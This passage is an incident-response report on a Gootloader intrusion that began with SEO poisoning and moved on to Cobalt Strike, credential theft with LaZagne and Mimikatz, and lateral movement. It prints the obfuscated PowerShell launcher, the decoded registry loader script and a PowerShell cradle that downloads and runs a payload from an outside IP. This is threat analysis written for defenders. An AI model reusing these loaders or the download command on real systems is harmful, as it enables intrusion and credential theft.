<div id="content" class="site-content" style="transform: none;">
<div class="site-content-cell" style="transform: none;">
<div class="wrap" style="transform: none;">
<div id="primary" class="content-area">
<main id="main" class="site-main">
<article id="post-6736" class="post-6736 post type-post status-publish format-standard hentry category-cobaltstrike category-gootloader category-lazagne category-psexec entry">
<div class="entry-content-holder">
<header class="entry-header">
<div class="entry-meta">
<span class="cat-links">
<a class="category-color-6" href="https://thedfirreport.com/category/cobaltstrike/">cobaltstrike</a>
<a class="category-color-94" href="https://thedfirreport.com/category/gootloader/">gootloader</a>
<a class="category-color-95" href="https://thedfirreport.com/category/lazagne/">lazagne</a>
<a class="category-color-23" href="https://thedfirreport.com/category/psexec/">psexec</a>
</span>
</div>
<h1 class="entry-title">SEO Poisoning – A Gootloader Story</h1>
<div class="entry-meta">
<span class="posted-on"><a href="https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/" rel="bookmark"><time class="entry-date published" datetime="2022-05-09T01:53:53+00:00">May 9, 2022</time></a></span> </div>
</header>
<div class="entry-content">
<p>In early February 2022, we witnessed an intrusion employing Gootloader (aka GootKit) as the initial access vector.</p>
<p>The intrusion lasted two days and comprised discovery, persistence, lateral movement, collection, defense evasion, credential access and command and control activity. During the post-exploitation phase, the threat actors used RDP, WMI, Mimikatz, Lazagne, WMIExec, and SharpHound. The threat actors then used this access to review sensitive documents.</p>
<h2>Background</h2>
<p><a href="https://news.sophos.com/en-us/2021/03/01/gootloader-expands-its-payload-delivery-options/" target="_blank" rel="noopener">Gootloader</a> was the name assigned to the multi-staged payload distribution by Sophos in March 2021. The threat actors utilize SEO (search engine optimization) poisoning tactics to move compromised websites hosting malware to the top of certain search requests such as “what is the difference between a grand agreement and a contract?” or “freddie mac shared driveway agreement?”</p>
<p>When the user searches for these phrases and clicks on one of the top results, they are left with a forum looking web page where the user is instructed to download a file, which they accidently execute (double click to open). You can learn more about Gootloader by reading these references. <a href="https://news.sophos.com/en-us/2021/03/01/gootloader-expands-its-payload-delivery-options/" target="_blank" rel="noopener">1</a> <a href="https://www.sentinelone.com/labs/gootloader-initial-access-as-a-service-platform-expands-its-search-for-high-value-targets/" target="_blank" rel="noopener">2</a> <a href="https://redcanary.com/threat-detection-report/threats/gootkit/" target="_blank" rel="noopener">3</a></p>
<p>The researcher behind the <a href="https://twitter.com/GootLoaderSites" target="_blank" rel="noopener">@GootLoaderSites</a> account is doing a great job of providing operational intelligence about the most recent malicious infrastructure. They also contact impacted businesses, monitor for newly created C2 addresses, and make the information public to the community. Thank you!</p>
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2022/05/11462-01.png"><img class="aligncenter size-full wp-image-6752 jetpack-lazy-image jetpack-lazy-image--handled" src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-01.png" alt="" width="603" height="359" srcset="https://thedfirreport.com/wp-content/uploads/2022/05/11462-01.png 603w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-01-300x179.png 300w" data-lazy-loaded="1" sizes="(max-width: 603px) 100vw, 603px" loading="eager"><noscript><img class="aligncenter size-full wp-image-6752" src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-01.png" alt="" width="603" height="359" srcset="https://thedfirreport.com/wp-content/uploads/2022/05/11462-01.png 603w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-01-300x179.png 300w" sizes="(max-width: 603px) 100vw, 603px" /></noscript></a></figure>
<p>&nbsp;</p>
<h2>Case Summary</h2>
<p>The intrusion started with a user searching Bing for “Olymplus Plea Agreement?”. The user then clicked on the second search result which led to the download and execution of a malicious javascript file (see video in Initial Access section). Upon execution, Gootloader utilized encoded PowerShell scripts to load Cobalt Strike into memory and persist on the host using a combination of registry keys and scheduled tasks.</p>
<p>Fifteen minutes after the initial execution, we observed the threat actors using the PowerShell implementation of SharpHound (BloodHound) to discover attack paths in the Active Directory-based network. The threat actors collected the results and pivoted to another host via a Cobalt Strike PowerShell beacon.</p>
<p>After pivoting, they disabled Windows Defender, before executing a second Cobalt Strike payload for a different command and control server. Around an hour after the initial infection, the threat actors ran <a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="noopener">LaZagne</a> to retrieve all saved credentials from the pivoted workstation. Meanwhile on the beachhead host, the threat actors ran Mimikatz via PowerShell to extract credentials.</p>
<p>With those credentials, the threat actors used RDP from the beachhead host to the already compromised workstation host. They then targeted several other workstations with Cobalt Strike beacon executables; however, no further activity was observed on those endpoints other than the initial lateral movement.</p>
<p>The threat actors favored RDP and remote WMI as their preferred methods to interact with the hosts and servers of interest throughout the rest of the intrusion. After around a four-hour pause of inactivity, the threat actors enabled restricted admin mode via WMI on a domain controller and logged in using RDP.</p>
<p>The threat actors then used Lazagne again on the domain controller to extract more credentials. Our evidence shows that the attackers then began looking for interesting documents on file shares. They opened the documents one-by-one on the remote host via RDP. They directed their focus to documents with legal and insurance-related content.</p>
<p>On the second and final day of the intrusion, the threat actors ran Advanced IP Scanner from the domain controller via the RDP session. Additionally, they inspected the file server and backup server, looking for more interesting data before leaving the network.</p>
<h2>Services</h2>
<p>We offer multiple services, including a&nbsp;<a href="https://thedfirreport.com/services/" target="_blank" rel="noreferrer noopener">Threat Feed service</a>&nbsp;that tracks Command and Control frameworks such as Cobalt Strike, BazarLoader, Covenant, Metasploit, Empire, PoshC2, etc. More information on this service and others can be found&nbsp;<a href="https://thedfirreport.com/services/" target="_blank" rel="noreferrer noopener">here</a>.</p>
<p>We also have artifacts and IOCs available from this case, such as pcaps, memory captures, files, event logs including Sysmon, Kape packages, and more, under our&nbsp;<a href="https://www.patreon.com/thedfirreport" target="_blank" rel="noreferrer noopener">Security Researcher and Organization</a>&nbsp;services.</p>
<h2>Timeline</h2>
<figure class="wp-block-image"><img loading="lazy" class="size-full wp-image-6823 aligncenter jetpack-lazy-image" src="https://thedfirreport.com/wp-content/uploads/2022/05/SEO-Poisoning-A-Gootloader-Story.png" alt="" width="1498" height="3072" data-lazy-srcset="https://thedfirreport.com/wp-content/uploads/2022/05/SEO-Poisoning-A-Gootloader-Story.png 1498w, https://thedfirreport.com/wp-content/uploads/2022/05/SEO-Poisoning-A-Gootloader-Story-146x300.png 146w, https://thedfirreport.com/wp-content/uploads/2022/05/SEO-Poisoning-A-Gootloader-Story-499x1024.png 499w, https://thedfirreport.com/wp-content/uploads/2022/05/SEO-Poisoning-A-Gootloader-Story-768x1575.png 768w, https://thedfirreport.com/wp-content/uploads/2022/05/SEO-Poisoning-A-Gootloader-Story-749x1536.png 749w, https://thedfirreport.com/wp-content/uploads/2022/05/SEO-Poisoning-A-Gootloader-Story-999x2048.png 999w" data-lazy-sizes="(max-width: 1498px) 100vw, 1498px" data-lazy-src="https://thedfirreport.com/wp-content/uploads/2022/05/SEO-Poisoning-A-Gootloader-Story.png?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img loading="lazy" class="size-full wp-image-6823 aligncenter" src="https://thedfirreport.com/wp-content/uploads/2022/05/SEO-Poisoning-A-Gootloader-Story.png" alt="" width="1498" height="3072" srcset="https://thedfirreport.com/wp-content/uploads/2022/05/SEO-Poisoning-A-Gootloader-Story.png 1498w, https://thedfirreport.com/wp-content/uploads/2022/05/SEO-Poisoning-A-Gootloader-Story-146x300.png 146w, https://thedfirreport.com/wp-content/uploads/2022/05/SEO-Poisoning-A-Gootloader-Story-499x1024.png 499w, https://thedfirreport.com/wp-content/uploads/2022/05/SEO-Poisoning-A-Gootloader-Story-768x1575.png 768w, https://thedfirreport.com/wp-content/uploads/2022/05/SEO-Poisoning-A-Gootloader-Story-749x1536.png 749w, https://thedfirreport.com/wp-content/uploads/2022/05/SEO-Poisoning-A-Gootloader-Story-999x2048.png 999w" sizes="(max-width: 1498px) 100vw, 1498px" /></noscript></figure>
<p>Analysis and reporting completed by <a href="https://twitter.com/Kostastsale" target="_blank" rel="noreferrer noopener">@kostastsale</a> <a href="https://twitter.com/iiamaleks" target="_blank" rel="noreferrer noopener">@iiamaleks</a> <a href="https://twitter.com/pigerlin" target="_blank" rel="noreferrer noopener">@pigerlin</a></p>
<h2>Initial Access</h2>
<p>The threat actor gained initial access using Gootloader malware. Here’s a video of the user searching and downloading the malware via the poisoned SEO search.</p>
<p></p><div class="jetpack-video-wrapper"><iframe loading="lazy" title="GootLoader Download" src="https://www.youtube.com/embed/IdR-tlv7w48?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" data-ratio="0.7504273504273504" data-width="1170" data-height="878" style="display: block; margin: 0px; width: 1170px; height: 878px;"></iframe></div><p></p>
<div class="ql-block" data-block-id="block-292c4d8b-731d-4054-9ad8-aa0e3750453a">The Javascript file is then executed when double clicked after the zip is opened.</div>
<div data-block-id="block-292c4d8b-731d-4054-9ad8-aa0e3750453a">&nbsp;</div>
<div class="ql-block" data-block-id="block-4e955f75-ef10-4195-acaa-f08c0fe0cccb"><a href="https://thedfirreport.com/wp-content/uploads/2022/05/11462-03.png"><img loading="lazy" class="aligncenter size-full wp-image-6754 jetpack-lazy-image" src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-03.png" alt="" width="1856" height="104" data-lazy-srcset="https://thedfirreport.com/wp-content/uploads/2022/05/11462-03.png 1856w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-03-300x17.png 300w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-03-1024x57.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-03-768x43.png 768w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-03-1536x86.png 1536w" data-lazy-sizes="(max-width: 1856px) 100vw, 1856px" data-lazy-src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-03.png?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img loading="lazy" class="aligncenter size-full wp-image-6754" src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-03.png" alt="" width="1856" height="104" srcset="https://thedfirreport.com/wp-content/uploads/2022/05/11462-03.png 1856w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-03-300x17.png 300w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-03-1024x57.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-03-768x43.png 768w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-03-1536x86.png 1536w" sizes="(max-width: 1856px) 100vw, 1856px" /></noscript></a></div>
<div data-block-id="block-4e955f75-ef10-4195-acaa-f08c0fe0cccb">&nbsp;</div>
<h2 class="ql-heading" data-block-id="block-791ac837-0320-4b7e-bbe9-17a9fdef8a55">Execution</h2>
<div class="ql-block" data-block-id="block-8a06f42e-3f81-4cb4-8fa3-14cec8ff1721">
<div class="ql-block" data-block-id="block-77aa056d-cb3e-4723-83ca-ad99236cd9e2">Gootloader upon execution creates two registry keys:</div>
<div data-block-id="block-77aa056d-cb3e-4723-83ca-ad99236cd9e2">&nbsp;</div>
<ul>
<li><code>HKCU:\SOFTWARE\Microsoft\Phone\Username</code> <code>HKCU:\SOFTWARE\Microsoft\Phone\Username0</code></li>
</ul>
<div class="ql-block" data-block-id="block-dbf59861-aeec-42eb-8fca-755417c550d7">
<div class="ql-block" data-block-id="block-78abdf2b-bce9-43b8-a02f-10454cde3d94">The first is populated with an encoded Cobalt Strike payload and the latter is used to store a .NET loader named <span data-void-detect="true">powershell.dll</span>.</div>
<div data-block-id="block-78abdf2b-bce9-43b8-a02f-10454cde3d94">&nbsp;</div>
<div class="ql-block" data-block-id="block-e61b9039-d4fc-4105-947b-3b49355181fb">
<div class="ql-block" data-block-id="block-964d917f-ad63-4bdb-b975-a99c243ade78"><a href="https://thedfirreport.com/wp-content/uploads/2022/05/11462-04.png"><img loading="lazy" class="aligncenter size-full wp-image-6755 jetpack-lazy-image" src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-04.png" alt="" width="1354" height="431" data-lazy-srcset="https://thedfirreport.com/wp-content/uploads/2022/05/11462-04.png 1354w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-04-300x95.png 300w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-04-1024x326.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-04-768x244.png 768w" data-lazy-sizes="(max-width: 1354px) 100vw, 1354px" data-lazy-src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-04.png?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img loading="lazy" class="aligncenter size-full wp-image-6755" src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-04.png" alt="" width="1354" height="431" srcset="https://thedfirreport.com/wp-content/uploads/2022/05/11462-04.png 1354w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-04-300x95.png 300w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-04-1024x326.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-04-768x244.png 768w" sizes="(max-width: 1354px) 100vw, 1354px" /></noscript></a></div>
<div data-block-id="block-964d917f-ad63-4bdb-b975-a99c243ade78">&nbsp;</div>
<div class="ql-block" data-block-id="block-788c1aa6-6324-4498-8db2-7813c6a14cf7"><a href="https://thedfirreport.com/wp-content/uploads/2022/05/11462-05.png"><img loading="lazy" class="aligncenter size-full wp-image-6756 jetpack-lazy-image" src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-05.png" alt="" width="1419" height="419" data-lazy-srcset="https://thedfirreport.com/wp-content/uploads/2022/05/11462-05.png 1419w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-05-300x89.png 300w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-05-1024x302.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-05-768x227.png 768w" data-lazy-sizes="(max-width: 1419px) 100vw, 1419px" data-lazy-src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-05.png?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img loading="lazy" class="aligncenter size-full wp-image-6756" src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-05.png" alt="" width="1419" height="419" srcset="https://thedfirreport.com/wp-content/uploads/2022/05/11462-05.png 1419w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-05-300x89.png 300w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-05-1024x302.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-05-768x227.png 768w" sizes="(max-width: 1419px) 100vw, 1419px" /></noscript></a></div>
<div class="ql-block" data-block-id="block-edce5403-7b85-4f79-97eb-7cc4ea535a00">
<div data-block-id="block-017085d9-5ba7-4b20-8b21-9215490a2768">&nbsp;</div>
<div class="ql-block" data-block-id="block-017085d9-5ba7-4b20-8b21-9215490a2768">Following the Registry events, a PowerShell command was launched executing an encoded command.</div>
<div data-block-id="block-017085d9-5ba7-4b20-8b21-9215490a2768">&nbsp;</div>
<div class="ql-block" data-block-id="block-0c12b2d0-c8e9-4bc1-a978-6c694f59b6a1"><a href="https://thedfirreport.com/wp-content/uploads/2022/05/11462-06.png"><img loading="lazy" class="aligncenter size-full wp-image-6757 jetpack-lazy-image" src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-06.png" alt="" width="1373" height="174" data-lazy-srcset="https://thedfirreport.com/wp-content/uploads/2022/05/11462-06.png 1373w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-06-300x38.png 300w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-06-1024x130.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-06-768x97.png 768w" data-lazy-sizes="(max-width: 1373px) 100vw, 1373px" data-lazy-src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-06.png?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img loading="lazy" class="aligncenter size-full wp-image-6757" src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-06.png" alt="" width="1373" height="174" srcset="https://thedfirreport.com/wp-content/uploads/2022/05/11462-06.png 1373w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-06-300x38.png 300w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-06-1024x130.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-06-768x97.png 768w" sizes="(max-width: 1373px) 100vw, 1373px" /></noscript></a></div>
<pre>"powershell.exe" /c C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe "/"e" NgAxA"DQANgA0ADkA"MgAxADEAOwB"zAGwAZQBlAHAAIAAtAHMAIAA4AD"MA"OwAkAG8AcABqAD0ARwBlAH"QA"LQBJAHQ"AZQBtAFAA"cg"B"vAHAAZQ"ByA"HQAeQ"Ag"AC0"AcABh"AH"QAaAAg"ACgAIg"BoAGsA"IgArACIAYwB1A"Do"AX"ABz"AG8"AZgA"iACsA"IgB0AH"c"AIgAr"ACIAY"QB"y"AGUAXABtAGkAYwAiA"CsAI"gB"yAG"8AcwAiAC"sA"IgB"v"AG"YAd"ABc"AFAAa"AB"vAG4AZQBcACIAKwBbAE"UAbgB2"AGkAc"gBv"AG4"A"bQBlAG4"AdA"B"dADo"AOgAo"ACIAdQBzA"GUAIgArAC"IAcgBuACIAK"wAiAGEAb"QBlACIAKQArA"C"IAM"AAi"AC"kAOwB"mAG8AcgAg"ACg"A"J"AB1AG8APQAw"ADs"AJAB1AG8AIAA"tAG"wAZQAgADc"A"N"gA"wADsA"JAB1AG8AK"wArA"CkAewBUAHIAeQ"B7A"CQA"b"QBwA"GQAKw"A9A"CQA"bwB"wAGo"ALgA"kAHU"AbwB9AEM"AY"QB"0A"GMAaAB7AH0AfQA7ACQAdQB"vAD0A"M"AA7AHc"AaAB"pAGwAZQAo"ACQAdAByAH"U"AZQApA"H"sAJAB1AG"8AKwA"r"A"DsAJABrAG8APQB"bAG"0AY"QB0AGgAX"QA6ADo"AK"AAi"AH"MAcQAiACs"AIgByAHQAI"g"ApACgAJ"AB1A"G8"AKQA"7A"GkA"ZgAoACQA"awBvACA"ALQB"lAHEAIAAxADAAM"A"AwACkAew"B"iAHIA"Z"Q"Bh"AGsAfQB9A"CQAeQB"sAD0AJABtAH"A"AZAAuAH"IAZQBwA"GwAY"QB"jA"GU"A"KAA"iACMAIgAsACQAawBv"ACk"AOwA"kAGsAagB"iAD"0AWwB"iA"HkA"dA"Bl"AFsA"XQBdA"DoAOgAo"ACIAb"gBlACIAKw"AiA"HcA"IgApACgAJAB5AGwA"L"gBM"AG"UA"bgBn"A"HQAaAAvADIAKQA7"AGYAbwB"yACg"A"JA"B"1A"G8A"P"QAwADsAJAB1AG"8"AIAAt"A"G"w"A"dAAgA"CQA"eQ"B"sAC4AT"ABlAG4AZwB0AG"gAOwAkAHUAb"wArAD"0A"MgA"pAH"s"AJABrAGoAY"gBbACQ"AdQBvAC8AMgBdAD0AWwBjAG8AbgB"2"AGUAcgB0A"F"0"A"OgA"6"ACgAIgBU"AG8AQg"AiACsA"IgB5AHQAZ"Q"AiACkAKA"AkAH"kAbAAuA"FM"Ad"QBiAHMA"dAB"yAGkAb"gBnACgAJAB1AG8"AL"AAy"A"CkA"LAAoADIAK"gA4AC"kAKQB9AFsA"cg"Bl"AGYAb"ABlAGM"AdA"BpAG8"AbgAuAGEAcw"BzAGUAbQBiA"GwAeQBd"ADo"AOgAoAC"IAT"ABv"AC"IA"K"wAiAGEA"Z"AA"i"AC"kAKA"A"kAGsAagB"iACkAO"wBbAE8AcA"Bl"AG4AXQA6"A"D"oA"KAAiAF"QAZQAiA"C"sAIgBzA"H"Q"AIgAp"A"Cg"AKQA7ADYA"MQA"xAD"gAOQA"4ADUAN"AA0AD"sA</pre>
<div class="ql-block" data-block-id="block-0369c6b7-7df8-4570-bb95-8d37a803299f">
<div class="ql-block" data-block-id="block-0e3873c9-1cf0-42de-ac2e-0b4941422734">The PowerShell command will extract the .NET loader from <code>HKCU:\SOFTWARE\Microsoft\Phone\Username0</code> and execute the code in memory via `Assembly.Load()`.</div>
<div data-block-id="block-0e3873c9-1cf0-42de-ac2e-0b4941422734">&nbsp;</div>
<pre>614649211; sleep -s 83; $opj=Get-ItemProperty -path ("hkcu:\software\microsoft\Phone\"+[Environment]::("username")+"0"); for ($uo=0;$uo -le 760;$uo++) { Try{$mpd+=$opj.$uo}Catch{} }; $uo=0; while($true) { $uo++;$ko=[math]::("sqrt")($uo); if($ko -eq 1000){break} } $yl=$mpd.replace("#",$ko); $kjb=[byte[]]::("new")($yl.Length/2); for($uo=0;$uo -lt $yl.Length;$uo+=2){ $kjb[$uo/2]=[convert]::("ToByte")($yl.Substring($uo,2),(2*8)) } [reflection.assembly]::("Load")($kjb); [Open]::("Test")(); 6118985</pre>
<div class="ql-block" data-block-id="block-a3f4ec2c-bf8f-4a2f-93bf-c718e5480360">
<div class="ql-block" data-block-id="block-b475c179-7404-469b-a3dd-7f85abe7be48"><a href="https://github.com/The-DFIR-Report/cyberchef-recipes/blob/main/SEO%20Poisoning%20-%20A%20GootLoader%20Story" target="_blank" rel="noopener">This</a> CyberChef recipe can be used to decode the related PS encoded payload.</div>
<div data-block-id="block-b475c179-7404-469b-a3dd-7f85abe7be48">&nbsp;</div>
<div class="ql-block" data-block-id="block-f1743eb5-45cd-4ac6-a564-0facb0cb7df6">
<div class="ql-block" data-block-id="block-7d641a06-a507-48f2-8cc8-10d1a4dae3e4">Once the PowerShell script is finished running, the next stage involves the .NET loader. The .NET loader will read <code>HKCU:\SOFTWARE\Microsoft\Phone\Username</code> and extract the encoded Cobalt Strike payload. This payload will be decoded and subsequently loaded into memory for execution.</div>
<div data-block-id="block-7d641a06-a507-48f2-8cc8-10d1a4dae3e4">&nbsp;</div>
<div class="ql-block" data-block-id="block-09ec8a3d-f5e2-4fb6-94f7-09290af2d578">
<div class="ql-block" data-block-id="block-2a6b4d8b-8a0e-4cde-a8ca-d334b229565a">A simple encoding scheme is used where a letter will correspond to one of the hex characters (0-F), or alternately three zeros.</div>
<div data-block-id="block-2a6b4d8b-8a0e-4cde-a8ca-d334b229565a">&nbsp;</div>
<pre>q-&gt;000
v-&gt;0
w-&gt;1
r-&gt;2
t-&gt;3
y-&gt;4
u-&gt;5
i-&gt;6
o-&gt;7
p-&gt;8
s-&gt;9
q-&gt;A
h-&gt;B
j-&gt;C
k-&gt;D
l-&gt;E
z-&gt;F</pre>
<div class="ql-block" data-block-id="block-42977d8d-9b64-4da7-8813-98bf28444b0d">
<div class="ql-block" data-block-id="block-1672db5c-a9a0-4f67-8616-5f6a359abafb">The following shows the source code responsible for the core logic of the .NET loader.</div>
<div data-block-id="block-1672db5c-a9a0-4f67-8616-5f6a359abafb">&nbsp;</div>
<div class="ql-block" data-block-id="block-de3ced6a-322d-4efc-afcb-32bf78f7968d">
<div class="ql-block" data-block-id="block-b8877622-e859-46fa-8d29-771f8f0de8d6"><a href="https://thedfirreport.com/wp-content/uploads/2022/05/11462-07.png"><img loading="lazy" class="aligncenter size-full wp-image-6758 jetpack-lazy-image" src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-07.png" alt="" width="879" height="630" data-lazy-srcset="https://thedfirreport.com/wp-content/uploads/2022/05/11462-07.png 879w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-07-300x215.png 300w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-07-768x550.png 768w" data-lazy-sizes="(max-width: 879px) 100vw, 879px" data-lazy-src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-07.png?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img loading="lazy" class="aligncenter size-full wp-image-6758" src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-07.png" alt="" width="879" height="630" srcset="https://thedfirreport.com/wp-content/uploads/2022/05/11462-07.png 879w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-07-300x215.png 300w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-07-768x550.png 768w" sizes="(max-width: 879px) 100vw, 879px" /></noscript></a></div>
<div class="ql-block" data-block-id="block-467073e8-ff7b-4b05-bd49-bd49f6acf8ba">
<div class="ql-block" data-block-id="block-20c36b1f-54c3-407c-af6f-e35fe01dac48"><span class="ql-comment" data-comment-ids="1165583548" data-comment-unresolved-ids="">The below diagram summarizes the Gootloader initial execution.&nbsp;</span></div>
<div data-block-id="block-20c36b1f-54c3-407c-af6f-e35fe01dac48">&nbsp;</div>
<div class="ql-block" data-block-id="block-1e24caeb-9be2-4ee4-becf-5ec7380741cf">
<div class="ql-block" data-block-id="block-3a5d1df6-af74-417f-b812-b9bf69ddab2e">
<div class="ql-block" data-block-id="block-0a4c680a-0cff-4472-b178-0b2da09a1ce9"><a href="https://thedfirreport.com/wp-content/uploads/2022/05/11462-08.png"><img loading="lazy" class="aligncenter size-full wp-image-6759 jetpack-lazy-image" src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-08.png" alt="" width="1471" height="766" data-lazy-srcset="https://thedfirreport.com/wp-content/uploads/2022/05/11462-08.png 1471w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-08-300x156.png 300w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-08-1024x533.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-08-768x400.png 768w" data-lazy-sizes="(max-width: 1471px) 100vw, 1471px" data-lazy-src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-08.png?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img loading="lazy" class="aligncenter size-full wp-image-6759" src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-08.png" alt="" width="1471" height="766" srcset="https://thedfirreport.com/wp-content/uploads/2022/05/11462-08.png 1471w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-08-300x156.png 300w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-08-1024x533.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-08-768x400.png 768w" sizes="(max-width: 1471px) 100vw, 1471px" /></noscript></a></div>
<div data-block-id="block-3900abf4-aa7c-4f9a-9e61-40aa9f6a1b4b">An <a class="ql-link" href="https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference?view=o365-worldwide#block-javascript-or-vbscript-from-launching-downloaded-executable-content" target="_blank" rel="noopener noreferrer" data-void-detect="true">excellent</a> resource from Microsoft describes a set of configurations that can be applied to Windows that can stop <code>.js</code> files from executing, preventing this attack chain from ever getting off the ground.</div>
<div data-block-id="block-3900abf4-aa7c-4f9a-9e61-40aa9f6a1b4b">&nbsp;</div>
<div class="ql-block" data-block-id="block-e8092100-c007-4094-a767-9428d3d5f233">
<div class="ql-block" data-block-id="block-cd65b100-6b6b-4de3-89ef-157ee6f6901c">
<div class="ql-block" data-block-id="block-3900abf4-aa7c-4f9a-9e61-40aa9f6a1b4b">During later stages of the intrusion, Cobalt Strike was executed interactively through RDP on multiple systems.</div>
<div data-block-id="block-3900abf4-aa7c-4f9a-9e61-40aa9f6a1b4b">&nbsp;</div>
<pre>powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('hxxp://37.120.198.225:80/trio'))"</pre>
<div class="ql-block" data-block-id="block-3b6bd9e3-33bc-459b-b55a-10f73395c7b9">
<h2 data-block-id="block-b3145516-20ec-4de8-84d4-bcccb181f8ae">&nbsp;</h2>
<h2 class="ql-heading" data-block-id="block-b3145516-20ec-4de8-84d4-bcccb181f8ae">Persistence</h2>
<div class="ql-block" data-block-id="block-e033ecf2-a2de-4882-b5f3-9a32193ce757">
<div class="ql-block" data-block-id="block-8ef8ee34-d811-42a2-80c2-24d3981be4c9">The Javascript (Gootloader) file invoked an encoded PowerShell command.</div>
<div data-block-id="block-8ef8ee34-d811-42a2-80c2-24d3981be4c9">&nbsp;</div>
<div class="ql-block" data-block-id="block-b59c2a5a-3c5f-4132-b4fd-ca044b141e3a">
<div class="ql-block" data-block-id="block-78527750-1e74-4ce1-b7de-fc8ebc6ab38c"><a href="https://thedfirreport.com/wp-content/uploads/2022/05/11462-09.png"><img loading="lazy" class="aligncenter size-full wp-image-6760 jetpack-lazy-image" src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-09.png" alt="" width="1815" height="189" data-lazy-srcset="https://thedfirreport.com/wp-content/uploads/2022/05/11462-09.png 1815w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-09-300x31.png 300w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-09-1024x107.png 1024w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-09-768x80.png 768w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-09-1536x160.png 1536w" data-lazy-sizes="(max-width: 1815px) 100vw, 1815px" data-lazy-src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-09.png?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img loading="lazy" class="aligncenter size-full wp-image-6760" src="https://thedfirreport.com/wp-content/uploads/2022/05/11462-09.png" alt="" width="1815" height="189" srcset="https://thedfirreport.com/wp-content/uploads/2022/05/11462-09.png 1815w, https://thedfirreport.com/wp-content/uploads/2022/05/11462-09-300x31.png 300w, 